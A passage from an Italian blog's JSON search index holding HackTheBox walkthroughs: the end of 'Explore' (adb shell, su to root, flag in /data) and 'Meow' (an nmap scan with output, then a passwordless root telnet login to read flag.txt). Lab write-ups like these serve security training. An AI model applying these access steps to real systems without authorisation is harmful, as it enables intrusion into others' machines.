macchina remota:\nadb -s 127.0.0.1 shell Digitiamo ‚Äúsu‚Äù per diventare utenti root:\nNella directory data vi sar√° la nostra flag:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/","tags":["CTF","HackTheBox","Walkthrough","Android","Metasploit","CVE"],"title":"Walkthrough Explore"},{"categories":["Walkthrough HackTheBox"],"contents":"Table Of Contents:\n Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa √® stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.\nIl comando √©:\nnmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L\u0026rsquo;output:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.129.46.55 Host is up (0.046s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds Connessione a Telnet Troviamo la porta 23 aperta e sta eseguendo un servizio telnet, proviamo a connetterci alla porta telnet 23.\nUsa il comando:\nsudo apt-get install telnet se non lo hai installato o stai usando una VM, poi lanciamo:\ntelnet [address] L\u0026rsquo;output sar√†:\nCi viene presentata una schermata di accesso. Tenendo presente il suggerimento fornito nell‚Äôattivit√† precedente. Un utente root √® in grado di accedere al servizio telnet senza password. Abbiamo provato a utilizzare il root e abbiamo ottenuto l‚Äôaccesso.\nConfermiamo nel terminale se siamo l‚Äôutente root.\nSe elenchiamo i file nella directory di lavoro corrente, vediamo che flag.txt √® elencato.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-meow/walkthrough_meow_ctf/","tags":["CTF","HackTheBox","Walkthrough","Telnet"],"title":"Walkthrough Meow"}]